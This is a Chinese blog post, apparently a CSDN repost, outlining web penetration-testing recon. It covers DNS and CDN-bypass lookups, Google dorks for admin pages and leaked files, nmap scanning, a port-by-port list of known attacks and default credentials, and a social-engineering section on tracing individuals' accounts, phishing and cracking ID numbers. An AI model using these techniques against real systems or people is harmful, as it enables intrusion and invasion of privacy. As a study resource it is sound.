+版权声明：本文为CSDN博主「SecAaron」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
+原文链接：<a href="https://blog.csdn.net/shinyhuang_/article/details/121338584">https://blog.csdn.net/shinyhuang_/article/details/121338584</a></p>
+<h2 id="0x01"><strong>0x01 信息收集</strong><a class="headerlink" href="#0x01" title="Permanent link">&para;</a></h2>
+<p>在一次Web渗透过程中，信息收集的目的是站在旁观者的角度，去了解整个Web应用的全貌。</p>
+<h3 id="1"><strong>1. 目标确认**</strong><a class="headerlink" href="#1" title="Permanent link">&para;</a></h3>
+<h4 id="11">1.1 域名注册信息**<a class="headerlink" href="#11" title="Permanent link">&para;</a></h4>
+<p>通过如下步骤确认目标所有者信息：</p>
+<p>Whois 目标域名/主机名： whois <a href="">example.com</a></p>
+<p>解析目标域名/主机名的IP地址： dig +short <a href="">example.com</a></p>
+<p>获取域名的详细解析过程    dig +trace <a href="">example.com</a> </p>
+<p>获取真实IP：</p>
+<p>​     验证是否存在CDN</p>
+<p>​     方法1：</p>
+<p>使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：</p>
+<p>​     <a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p>
+<p>​     <a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a></p>
+<p>​     <a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></p>
+<p>​     方法2：</p>
+<p>试用nslookup进行检测，如果返回域名解析对应多个IP，那么多半是试用了CDN.</p>
+<p>​     nslookup example.com</p>
+<p>​     方法3:</p>
+<p>​     在线工具查看是否存在CDN，可以参考以下站点:</p>
+<p>​     <a href="http://www.cdnplanet.com/tools/cdnfinder/">http://www.cdnplanet.com/tools/cdnfinder/</a></p>
+<p>​     <a href="http://www.ipip.net/ip.html">http://www.ipip.net/ip.html</a></p>
+<p>​    绕过CDN查找网站真实IP</p>
+<p>​    1.查询历史DNS记录(ip的历史解析域名，域名的历史解析ip)</p>
+<p>查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：</p>
+<p>​    <a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></p>
+<p>​    <a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p>
+<p><a href="https://censys.io/ipv4?q=baidu.com">https://censys.io/ipv4?q=baidu.com</a></p>
+<p>非常牛逼的IP记录站，还能分析内链之类找出可能的IP地址，此外还会记录历史。</p>
+<p>​         viewdns.info</p>
+<p>同样是个令站长十分蛋疼的DNS历史记录网站，记录了几年内的更改记录。</p>
+<p><a href="http://securitytrails.com/">securitytrails.com</a></p>
+<p><a href="https://site.ip138.com/">https://site.ip138.com/</a></p>
+<p>​       庞大的DNS历史数据库，可以查出几年内网站用过的IP、机房信息等。</p>
+<p><a href="http://iphostinfo.com/">iphostinfo.com</a></p>
+<p>​        <strong>注意：这个网站可以遍历FTP、MX记录和常见二级域名，有些站长喜欢把邮箱服务也放在自己主机上，侧面泄露了真实的IP地址，通过这个网站可以进行检查。</strong></p>
+<p>​    2.查询子域名（捷径，去众测平台、github找官方发布过的）</p>
+<p>注意：有可能有些站长只给主站或流量大的子域名做了CDN,而很多子域名都是和主站在同一台服务器上，或者 C段中，这样可以通过**子域名来辅助找到网站真实IP**</p>
+<p>爆破子域名:</p>
+<p>layer子域名挖掘机（字典要自己丰富）</p>
+<p><a href="http://z.zcjun.com/(在线子域名挖掘">http://z.zcjun.com/(在线子域名挖掘</a>)</p>
+<p>fuzzdomain 很好用，速度快</p>
+<p>搜索引擎拿子域名、旁站（同IP网站）、C段：</p>
+<p>可用搜索引擎语法查询子域名：</p>
+<p>谷歌 百度 bing 搜狗(搜索微信文章) 雅虎 略有差异</p>
+<p>详细用法:</p>
+<p>​      （1）site: =主域名,搜索其主要域名下面的子域名</p>
+<p>​      （2）allintext: = 搜索文本,但不包括网页标题和链接</p>
+<p>​      （3）allinlinks: = 搜索链接, 不包括文本和标题。</p>
+<p>​      （4）related:URL = 列出于目标URL地址有关的网页。</p>
+<p>​      （5）link:URL = 列出到链接到目标URL的网页清单。</p>
+<p>​      （6）使用“-”去掉不想看的结果，例如site:<a href="http://baidu.com/">baidu.com</a> -<a href="http://image.baidu.com/">image.baidu.com</a></p>
+<p>百度语法：</p>
+<p><a href="https://www.cnblogs.com/k0xx/p/12794452.html">https://www.cnblogs.com/k0xx/p/12794452.html</a></p>
+<p>谷歌语法：</p>
+<p><a href="https://blog.csdn.net/u012991692/article/details/82937100?biz_id=102&amp;utm_term=Googlehack&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-82937100&amp;spm=1018.2118.3001.4187">https://blog.csdn.net/u012991692/article/details/82937100?biz_id=102&amp;utm_term=Googlehack&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-82937100&amp;spm=1018.2118.3001.4187</a></p>
+<p>GHDB：</p>
+<p><a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p>
+<p>3.资产搜索(旁站\C段\特征):</p>
+<p>​    </p>
+<p><a href="https://www.shodan.io/">https://www.shodan.io</a>(关键字爆ip)</p>
+<p>​    <a href="https://fofa.so/">https://fofa.so</a> </p>
+<p><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p>
+<p>​    <a href="http://www.yunsee.cn/info.html">http://www.yunsee.cn/info.html</a> （云悉在线资产平台)</p>
+<p><a href="http://subdomain.chaxun.la/">http://subdomain.chaxun.la</a> （查询啦）</p>
+<p><a href="https://www.virustotal.com/gui/home/search">https://www.virustotal.com/gui/home/search</a></p>
+<p><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p>
+<p><a href="https://duckduckgo.com/">https://duckduckgo.com</a> （一个不会存储你个人信息的搜索引擎）</p>
+<p><a href="https://crt.sh/">https://crt.sh/</a>（SSL证书查询）</p>
+<p><a href="https://icp.aizhan.com/(域名备案">https://icp.aizhan.com/(域名备案</a>)</p>
+<p>4.对方服务器给自己发邮件暴露IP</p>
+<p>5.APP客户端爆ip</p>
+<h4 id="12-dns"><strong>1.2 DNS信息查询</strong><a class="headerlink" href="#12-dns" title="Permanent link">&para;</a></h4>
+<p>目的:</p>
+<p>注册者名称及邮箱,再反查其他域名</p>
+<p>手机号 座机号</p>
+<p>ASN号</p>
+<p>地址</p>
+<h5 id="dns">在线DNS信息查询工具<a class="headerlink" href="#dns" title="Permanent link">&para;</a></h5>
+<p><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a> </p>
+<p><a href="https://www.dnsdb.io/">https://www.dnsdb.io</a> （DNS搜索引擎）</p>
+<p><a href="http://searchdns.netcraft.com/">http://searchdns.netcraft.com</a></p>
+<p><a href="http://whois.nawang.cn/">http://whois.nawang.cn/</a></p>
+<p><a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a></p>
+<p><a href="https://whois.west.cn/">https://whois.west.cn/</a></p>
+<p><a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a> (站长之家)</p>
+<p><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a> （天眼查）</p>
+<p><a href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a> （国家企业信用信息系统）</p>
+<p><a href="http://www.beianbeian.com/">www.beianbeian.com/</a> （ICP备案查询）</p>
+<h4 id="13"><strong>1.3 测试域传送漏洞</strong><a class="headerlink" href="#13" title="Permanent link">&para;</a></h4>
+<p>域传送是一种DNS事务，用于在主从服务器间复制DNS记录。虽然如今已经很少见主机会开启，但是还是应该确认一下。一旦存在域传送漏洞，就意味着你获取了整个域下面所有的记录。</p>
+<p>dnsrecon -d <a href="">example.com</a></p>
+<p>dnsenum <a href="">example.com</a>  包含自动检测域传送漏洞</p>
+<h4 id="14"><strong>1.4 业务相关</strong><a class="headerlink" href="#14" title="Permanent link">&para;</a></h4>
+<p>github泄露：</p>
+<p>in:name test        #仓库标题搜索含有关键字 SpringCloud</p>
+<p>in:descripton test     #仓库描述搜索含有关键字</p>
+<p>in:readme test       #Readme文件搜素含有关键字</p>
+<p>stars:&gt;3000 test      #stars数量大于3000的搜索关键字</p>
+<p>stars:1000..3000 test   #stars数量大于1000小于3000的搜索关键字</p>
+<p>forks:&gt;1000 test      #forks数量大于1000的搜索关键字</p>
+<p>forks:1000..3000 test   #forks数量大于1000小于3000的搜索关键字</p>
+<p>size:&gt;=5000 test      #指定仓库大于5000k(5M)的搜索关键字</p>
+<p>pushed:&gt;2019-02-12 test  #发布时间大于2019-02-12的搜索关键字</p>
+<p>created:&gt;2019-02-12 test  #创建时间大于2019-02-12的搜索关键字</p>
+<p>user:test         #用户名搜素</p>
+<p>license:apache-2.0 test  #明确仓库的 LICENSE 搜索关键字</p>
+<p>language:java test     #在java语言的代码中搜索关键字</p>
+<p>user:test in:name test   #组合搜索,用户名test的标题含有test的</p>
+<p>网盘泄露：</p>
+<p>各种云网盘，详见虫部落搜索:<a href="http://magnet.chongbuluo.com/">magnet.chongbuluo.com</a></p>
+<p>敏感路径扫描：<a href="https://github.com/ring04h/weakfilescan">https://github.com/ring04h/weakfilescan</a></p>
+<h3 id="2-osint"><strong>2. OSINT 公开情报收集</strong><a class="headerlink" href="#2-osint" title="Permanent link">&para;</a></h3>
+<h5 id="21"><strong>2.1社会工程学技巧(</strong><a href="evernote:///view/31101406/s32/16870416-0cf3-485e-9e1d-1cc35caf7cf1/16870416-0cf3-485e-9e1d-1cc35caf7cf1/">网络安全攻防：社会工程学之概述</a>)<a class="headerlink" href="#21" title="Permanent link">&para;</a></h5>
+<p>查看注册的网站：0xreg reg007</p>
+<p>知道账号去已注册的网站找回密码，可以看到打码后的用户名、邮箱、真实姓名等信息，如果运气好没准能从数据包或html中找到未被打码的信息</p>
+<p>可以从这些方面判断用户是否注册过</p>
+<p>找回密码</p>
+<p>输入账号，如果进入下一步了则该账号存在</p>
+<p>登录</p>
+<p>输入账号和密码，如果提示密码错误，则表示该用户已存在</p>
+<p>注册</p>
+<p>填写账号时一般网站会去检测该账号是否已存在，如果已存在则会提示不可重复注册</p>
+<p>知道QQ</p>
+<p>通过QQ邮箱和QQ号搜索支付宝、淘宝账号等其他可能的常用平台</p>
+<p>去腾讯\新浪微博搜索</p>
+<p>通过微信搜索</p>
+<p>查看QQ空间\相册\地区\星座\生日\昵称(后续构建字典以及跨平台搜集)</p>
+<p>通过说说、留言、日志找到其好友</p>
+<p>加QQ钓鱼\共同好友\可能认识的人</p>
+<p>知道手机号</p>
+<p>搜索QQ、微信、钉钉等社交账号</p>
+<p>在比较火的一些APP和网站上注册或忘记密码来判断是否注册过账号</p>
+<p>查询支付宝账号，尝试输入常见姓氏获取名字(转账到该手机号,会提示输入姓氏验证)</p>
+<p>通过对方的职业、兴趣找到该领域知名度较高的社交网站反查</p>
+<p>根据在QQ空间、朋友圈等动态用百度识图识别照片</p>
+<p>在微博、ins、Twitter、fb、百度贴吧搜索相近关键字，按地域、年龄、男女、用户名等筛选</p>
+<p>留意社交动态</p>
+<p>发布时间线</p>
+<p>使用什么客户端 iPhone Android还是浏览器</p>
+<p>针对客户端预先制定exploit </p>
+<p>​        注意每一条链接 / 图片 / 视频</p>
+<p>链接可能包含用户ID</p>
+<p>图片可能包含水印，exif可能会有GPS定位和手机类型,图片内容特征</p>
+<p>视频也有可能有水印暴露社交账号ID,拍摄地点</p>
+<p>从最早发布的动态看起，会有很大收获</p>
+<p>一般得到一个账号的密码就相当于得到了其他账号的密码</p>
+<p>一般人不同账号的用户名都是相同或相近的</p>
+<p>一般人的社交账号头像用的都是一样的</p>
+<p>尝试破解社保、公积金账号、身份证号（出生地、生日、星座、派出所代码）</p>
+<p>虫部落快搜之文件搜索:<a href="https://search.chongbuluo.com/">https://search.chongbuluo.com/</a></p>
+<p>qq群、群文件、贴吧论坛、目标自用论坛等社交平台钓鱼和信息泄露(爬邮箱等信息)</p>
+<p>电子邮件伪造、网络钓鱼</p>
+<p>下载恶意程序</p>
+<p>输入敏感信息</p>
+<p>大部分信息可以用来生成密码字典</p>
+<p>对人：说服对方达成一致、恐吓对方（敏感词、漏洞、病毒、权威机构名称、），钓鱼获取信息</p>
+<h5 id="22osint"><strong>2.2搜索引擎OSINT</strong><a class="headerlink" href="#22osint" title="Permanent link">&para;</a></h5>
+<h6 id="google-hackingbaidubingsouhugithub">Google Hacking(baidu\bing\souhu\github)<a class="headerlink" href="#google-hackingbaidubingsouhugithub" title="Permanent link">&para;</a></h6>
+<p>**GoogleHacking**常用语法</p>
+<p>1、intext：（仅针对Google有效） 把网页中的正文内容中的某个字符作为搜索的条件</p>
+<p>2、intitle： 把网页标题中的某个字符作为搜索的条件</p>
+<p>3、cache： 搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息</p>
+<p>4、filetype/ext： 指定一个格式类型的文件作为搜索对象</p>
+<p>5、inurl： 搜索包含指定字符的URL</p>
+<p>6、site： 在指定的(域名)站点搜索相关内容</p>
+<p><strong>GoogleHacking其他语法</strong></p>
+<p>1、引号 ” ” 把关键字打上引号后，把引号部分作为整体来搜索</p>
+<p>2、or 同时搜索两个或更多的关键字</p>
+<p>3、link 搜索某个网站的链接 link:<a href="http://baidu.com/">baidu.com</a>即返回所有和baidu做了链接的URL</p>
+<p>4、info 查找指定站点的一些基本信息</p>
+<p>**GoogleHackingDatabase:<a href="ht**tps://www.exploit-db.com/google-hacking-database">google-hacking-database</a></p>
+<p><strong>GoogleHacking典型用法(特定资产的万能密码也要积累)</strong></p>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li>管理后台地址</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>site:<a href="http://target.com/">target.com</a> intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system</p>
+<p>site:<a href="http://target.com/">target.com</a> inurl:login | inurl:admin | inurl:manage | inurl:manager | inurl:admin_login | inurl:system | inurl:backend</p>
+<p>site:<a href="http://target.com/">target.com</a> intitle:管理 | 后台 | 后台管理 | 登陆 | 登录</p>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li>上传类漏洞地址</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>site:<a href="http://target.com/">target.com</a> inurl:file</p>
+<p>site:<a href="http://target.com/">target.com</a> inurl:upload</p>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li>注入页面</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>site:<a href="http://target.com/">target.com</a> inurl:php?id=</p>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li>编辑器页面</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>site:<a href="http://target.com/">target.com</a> inurl:ewebeditor</p>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li>目录遍历漏洞</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>site:<a href="http://target.com/">target.com</a> intitle:index.of</p>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li>SQL错误</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>site:<a href="http://target.com/">target.com</a> intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:”Warning: mysql_query()" | intext:”Warning: pg_connect()"</p>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li>phpinfo()</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>site:<a href="http://target.com/">target.com</a> ext:php intitle:phpinfo "published by the PHP Group"</p>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li>配置文件泄露</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>site:<a href="http://target.com/">target.com</a> ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini</p>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li>数据库文件泄露</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>site:<a href="http://target.com/">target.com</a> ext:.sql | .dbf | .mdb | .db</p>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li>日志文件泄露</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>site:<a href="http://target.com/">target.com</a> ext:.log</p>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li>备份和历史文件泄露</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>site:<a href="http://target.com/">target.com</a> ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar</p>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li>公开文件泄露</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>site:<a href="http://target.com/">target.com</a> filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv</p>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li>邮箱信息</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>site:<a href="http://target.com/">target.com</a> intext:@<a href="http://target.com/">target.com</a></p>
+<p>site:<a href="http://target.com/">target.com</a> 邮件</p>
+<p>site:<a href="http://target.com/">target.com</a> email</p>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li>社工信息</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>site:<a href="http://target.com/">target.com</a> intitle:账号 | 密码 | 工号 | 学号 | 身份证</p>
+<h5 id="23"><strong>2.3浏览器实用插件：</strong><a class="headerlink" href="#23" title="Permanent link">&para;</a></h5>
+<p>Wappalyzer：识别网站使用的中间件及其版本，再去漏洞库和搜索引擎找公开披露的漏洞</p>
+<p>SwitchOmega：快捷切换代理</p>
+<p>shodan：识别开放端口，主机服务等</p>
+<p>hacktools:综合插件,很强大</p>
+<p>firefox渗透便携版,工具集成很多</p>
+<p><strong>注意：根据获得服务、中间件信息、编辑器版本、数据库等OSINT去各大漏洞库、搜索引擎找漏洞利用</strong></p>
+<h5 id="24cnvd"><strong>2.4乌云和cnvd</strong><a class="headerlink" href="#24cnvd" title="Permanent link">&para;</a></h5>
+<p>乌云库\乌云镜像\GHDB\CNVD等公开漏洞库</p>
+<h2 id="0x02-mapping"><strong>0x02 Mapping</strong><a class="headerlink" href="#0x02-mapping" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>在一次渗透测试过程中，Mapping的目的是站在一个普通用户的角度去了解整个应用的全貌。</p>
+</blockquote>
+<h3 id="1_1"><strong>1.主动扫描</strong><a class="headerlink" href="#1_1" title="Permanent link">&para;</a></h3>
+<h4 id="11_1"><strong>1.1常见服务漏洞:</strong><a class="headerlink" href="#11_1" title="Permanent link">&para;</a></h4>
+<p>nmap的使用:</p>
+<p><strong>脚本扫描，隐蔽扫描，端口扫描，服务识别，OS识别，探测WAF</strong></p>
+<p>nmap脚本主要分为以下几类，在扫描时可根据需要设置–script=类别这种方式进行比较笼统的扫描：</p>
+<hr />
+<blockquote>
+<p>auth: 负责处理鉴权证书（绕开鉴权）的脚本</p>
+<p>broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务</p>
+<p>brute: 提供暴力破解方式，针对常见的应用如http/snmp等</p>
+<p>default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力</p>
+<p>discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等</p>
+<p>dos: 用于进行拒绝服务攻击</p>
+<p>exploit: 利用已知的漏洞入侵系统</p>
+<p>external: 利用第三方的数据库或资源，例如进行whois解析</p>
+<p>fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽</p>
+<p>malware: 探测目标机是否感染了病毒、开启了后门等信息</p>
+<p>safe: 此类与intrusive相反，属于安全性脚本</p>
+<p>version: 负责增强服务与版本扫描（Version Detection）功能的脚本</p>
+<p>vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067</p>
+</blockquote>
+<p>（1） nmap --script=auth 192.168.137.*</p>
+<p>负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令</p>
+<p>（2）nmap --script=brute 192.168.137.*</p>
+<p>提供暴力破解的方式  可对数据库，smb，snmp等进行简单密码的暴力猜解</p>
+<p>（3）nmap --script=default 192.168.137.* 或者 nmap -sC 192.168.137.*</p>
+<p>默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击</p>
+<p>（4）nmap --script=vuln 192.168.137.*</p>
+<p>检查是否存在常见漏洞</p>
+<p>（5）nmap -n -p445 --script=broadcast 192.168.137.4</p>
+<p>在局域网内探查更多服务开启状况</p>
+<p>（6）nmap --script external 202.103.243.110</p>
+<p>利用第三方的数据库或资源，例如进行whois解析</p>
+<p>nmap --script banner ip</p>
+<p>nmap -p port -sV ip</p>
+<p>获取软件版本信息</p>
+<p>nmap -O ip</p>
+<p>操作系统信息，版本</p>
+<p>nmap -A -v ip</p>
+<p>完整信息获取</p>
+<p>-sN;-sF;-sX 隐蔽扫描</p>
+<p>-sN是Null扫描,是通过发送非常规的TCP通信数据包对计算机进行探测.</p>
+<p>nmap -sN 127.0.0.1</p>
+<p>-sF是FIN扫描,当我们使用TCP SYN扫描时可能会被目标主机的防火墙发现,会阻止SYN数据包,这时我们使用TCP FIN扫描方式会有很好的穿透效果.</p>
+<p>nmap -sF 127.0.0.1</p>
+<ul>
+<li>
+<ul>
+<li>扫描前1000号TCP端口</li>
+</ul>
+<p>nmap 192.168.100.2</p>
+</li>
+<li>
+<p>Ping扫描8个本地主机(按ARP、ICMP、TCP 80的顺序)</p>
+<p>nmap –sP 192.168.100.0-7</p>
+</li>
+<li>
+<p>扫描80,443端口</p>
+<p>nmap -p 80,443 192.168.100.2</p>
+</li>
+<li>
+<p>扫描前1000号TCP端口，OS指纹，服务，然后运行一个NSE脚本</p>
+<p>sudo nmap -A 192.168.100.2</p>
+</li>
+<li>
+<p>扫描全部65535个TCP端口，OS指纹，服务，然后运行一个NSE脚本</p>
+<p>sudo nmap –A –p- 192.168.100.2</p>
+</li>
+<li>
+<p>扫描前1000号UDP端口</p>
+<p>sudo nmap -sU 192.168.100.2</p>
+</li>
+<li>
+<p>扫描所有65535个UDP端口</p>
+<p>sudo nmap -sU –p- 192.168.100.2</p>
+</li>
+<li>
+<p>扫描所有65535个UDP端口，并获取服务、OS指纹，之后运行一些NSE脚本</p>
+<p>sudo nmap –sU -p- -A 192.168.100.2</p>
+</li>
+</ul>
+<p>nmap脑图备查:</p>
+<h4 id="12"><strong>1.2常见端口漏洞:</strong><a class="headerlink" href="#12" title="Permanent link">&para;</a></h4>
+<p><a href="evernote:///view/31101406/s32/665dad88-1422-4abc-89fa-cedae806fc53/665dad88-1422-4abc-89fa-cedae806fc53/">常见端口渗透总结 - 戚源 - 博客园</a></p>
+<p><strong>Masscan</strong> -p80,800 ip --rate=10000</p>
+<p>识别端口后，百度谷歌相应端口攻击办法（端口渗透总结，可见笔记）</p>
+<p>21 / FTP</p>
+<p>匿名/暴力破解</p>
+<p>拒绝服务</p>
+<p>22 / SSH</p>
+<p>暴力破解</p>
+<p>23 / telnet</p>
+<p>Winbox(CVE-2018-14847)</p>
+<p><a href="https://github.com/BasuCert/WinboxPoC">https://github.com/BasuCert/WinboxPoC</a></p>
+<p>弱口令 / 暴力破解</p>
+<p>161 / snmp</p>
+<p>弱口令</p>
+<p><a href="https://blog.csdn.net/archersaber39/article/details/78932252">https://blog.csdn.net/archersaber39/article/details/78932252</a></p>
+<p>389 / ladp</p>
+<p>匿名访问</p>
+<p><a href="https://www.cnblogs.com/persuit/p/5706432.html">https://www.cnblogs.com/persuit/p/5706432.html</a></p>
+<p>ladp注入</p>
+<p><a href="http://www.4hou.com/technology/9090.html">http://www.4hou.com/technology/9090.html</a></p>
+<p><a href="https://www.freebuf.com/articles/web/149059.html">https://www.freebuf.com/articles/web/149059.html</a></p>
+<p>443 / ssl</p>
+<p>openssl心脏出血</p>
+<p><a href="https://paper.seebug.org/437/http://www.anquan.us/static/drops/papers-1381.htmlhttps://www.freebuf.com/sectool/33191.html">https://paper.seebug.org/437/http://www.anquan.us/static/drops/papers-1381.htmlhttps://www.freebuf.com/sectool/33191.html</a></p>
+<p>445 / smb</p>
+<p>win10拒绝服务</p>
+<p>永恒之蓝RCE</p>
+<p>875 / rsync</p>
+<p>匿名访问</p>
+<p><a href="http://www.anquan.us/static/bugs/wooyun-2016-0190815.htmlhttps://paper.seebug.org/409/http://www.91ri.org/11093.html">http://www.anquan.us/static/bugs/wooyun-2016-0190815.htmlhttps://paper.seebug.org/409/http://www.91ri.org/11093.html</a></p>
+<p>1433 / mssql</p>
+<p>暴力破解</p>
+<p><a href="http://www.anquan.us/static/drops/tips-12749.htmlhttps://www.seebug.org/appdir/Microsoft%20SQL%20Server">http://www.anquan.us/static/drops/tips-12749.htmlhttps://www.seebug.org/appdir/Microsoft%20SQL%20Server</a></p>
+<p>1521 / oracle</p>
+<p>暴力破解</p>
+<p><a href="https://www.exploit-db.com/exploits/33084">https://www.exploit-db.com/exploits/33084</a></p>
+<p>2601 / zebra</p>
+<p><a href="http://www.anquan.us/static/bugs/wooyun-2013-047409.html">http://www.anquan.us/static/bugs/wooyun-2013-047409.html</a></p>
+<p>3128 / squid</p>
+<p>3306 / mysql</p>
+<p>RCE</p>
+<p><a href="http://www.91ri.org/17511.html">http://www.91ri.org/17511.html</a></p>
+<p>CVE-2015-0411</p>
+<p>hash破解</p>
+<p><a href="https://www.freebuf.com/column/153561.html">https://www.freebuf.com/column/153561.html</a></p>
+<p>waf绕过</p>
+<p><a href="https://www.freebuf.com/articles/web/155570.html">https://www.freebuf.com/articles/web/155570.html</a></p>
+<p>general_log_file getshell</p>
+<p><a href="https://www.freebuf.com/column/143125.html">https://www.freebuf.com/column/143125.html</a></p>
+<p>提权</p>
+<p><a href="http://www.91ri.org/16540.html">http://www.91ri.org/16540.html</a></p>
+<p>3312 / kangle</p>
+<p>getshell</p>
+<p><a href="https://www.secpulse.com/archives/23927.html">https://www.secpulse.com/archives/23927.html</a></p>
+<p>3389 / rdp</p>
+<p>shift 放大镜 输入法绕过 guest用户</p>
+<p>永恒之蓝(ESTEEMAUDIT)</p>
+<p><a href="https://www.freebuf.com/articles/system/132171.htmlhttps://www.anquanke.com/post/id/86328">https://www.freebuf.com/articles/system/132171.htmlhttps://www.anquanke.com/post/id/86328</a></p>
+<p>ms12-020</p>
+<p><a href="https://blog.csdn.net/meyo_leo/article/details/77950552">https://blog.csdn.net/meyo_leo/article/details/77950552</a></p>
+<p>4440 / rundeck</p>
+<p><a href="https://www.secpulse.com/archives/29500.html">https://www.secpulse.com/archives/29500.html</a></p>
+<p>4848 / glassfish</p>
+<p>文件读取</p>
+<p><a href="https://www.secpulse.com/archives/42277.html">https://www.secpulse.com/archives/42277.html</a></p>
+<p><a href="https://www.anquanke.com/post/id/85948">https://www.anquanke.com/post/id/85948</a></p>
+<p>GlassFish2 / admin:admin GlassFish3,4 / 如果管理员不设置帐号本地会自动登录,远程访问会提示配置错误</p>
+<p>5432 / PostgreSQL</p>
+<p>RCE</p>
+<p><a href="https://www.cnblogs.com/KevinGeorge/p/8521496.html">https://www.cnblogs.com/KevinGeorge/p/8521496.html</a></p>
+<p><a href="https://www.secpulse.com/archives/69153.html">https://www.secpulse.com/archives/69153.html</a></p>
+<p>默认账号postgres</p>
+<p>参考</p>
+<p><a href="http://www.91ri.org/13070.html">http://www.91ri.org/13070.html</a></p>
+<p><a href="http://www.91ri.org/6507.html">http://www.91ri.org/6507.html</a></p>
+<p>5672,15672,4369,25672 / RabbitMQ</p>
+<p>（guest/guest）</p>
+<p>5900 / VNC</p>
+<p><a href="https://www.seebug.org/appdir/RealVNC">https://www.seebug.org/appdir/RealVNC</a></p>
+<p>5984 / CouchDB</p>
+<p> <a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a></p>
+<p>6082 / varnish</p>
+<p>CLI 未授权</p>
+<p><a href="https://www.secpulse.com/archives/10681.html">https://www.secpulse.com/archives/10681.html</a></p>
+<p>6379 / redis</p>
+<p>Redis未授权</p>
+<p>ssh publickey</p>
+<p>crontab</p>
+<p>webshell</p>
+<p>反序列化</p>
+<p>开机自启文件夹写bat</p>
+<p>参考</p>
+<p><a href="https://www.freebuf.com/column/170710.html">https://www.freebuf.com/column/170710.html</a></p>
+<p>7001,7002 / WebLogic</p>
+<p>默认弱口令</p>
+<p>weblogic/weblogic ,weblogic/welcom ,weblogic/welcom1,weblogic1/weblogic</p>
+<p>反序列</p>
+<p>CVE-2018-2628</p>
+<p><a href="https://www.freebuf.com/articles/web/169770.html">https://www.freebuf.com/articles/web/169770.html</a></p>
+<p><a href="https://www.seebug.org/appdir/WebLogic">https://www.seebug.org/appdir/WebLogic</a></p>
+<p>9200,9300 / elasticsearch</p>
+<p>CVE-2015-1427</p>
+<p><a href="http://www.anquan.us/static/drops/papers-5142.html">http://www.anquan.us/static/drops/papers-5142.html</a></p>
+<p>CVE-2018-17246</p>
+<p><a href="https://www.seebug.org/vuldb/ssvid-97730">https://www.seebug.org/vuldb/ssvid-97730</a></p>
+<p>参考</p>
+<p><a href="https://www.seebug.org/search/?keywords=elasticsearch">https://www.seebug.org/search/?keywords=elasticsearch</a></p>
+<p>9000 / fcgi</p>
+<p><a href="https://paper.seebug.org/289/">https://paper.seebug.org/289/</a></p>
+<p>9043 / WebSphere</p>
+<p>Websphere8.5</p>
